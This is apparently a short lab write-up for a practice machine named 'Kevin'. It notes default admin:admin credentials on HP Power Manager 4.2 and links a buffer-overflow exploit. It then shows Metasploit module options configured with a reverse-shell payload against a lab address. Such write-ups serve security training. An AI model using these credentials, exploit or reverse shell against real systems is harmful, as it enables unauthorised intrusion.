# Kevin

### Enumeration

```
80/tcp    open  tcpwrapped
```

HP Power Manager

Default credentials -> admin:admin

HP Power Manager 4.2 (Build 7)

HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasploit)

[https://www.exploit-db.com/exploits/18015](https://www.exploit-db.com/exploits/18015)

### Access

```
msf6 exploit(windows/http/hp_power_manager_filename) > options

Module options (exploit/windows/http/hp_power_manager_filename):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,typ
                                       e:host:port][...]
   RHOSTS   192.168.145.45   yes       The target host(s), range CIDR identifier,
                                       or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                         process, none)
   LHOST     tun0             yes       The listen address (an interface may be sp
                                        ecified)
   LPORT     80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows XP SP3 / Win Server 2003 SP0
```
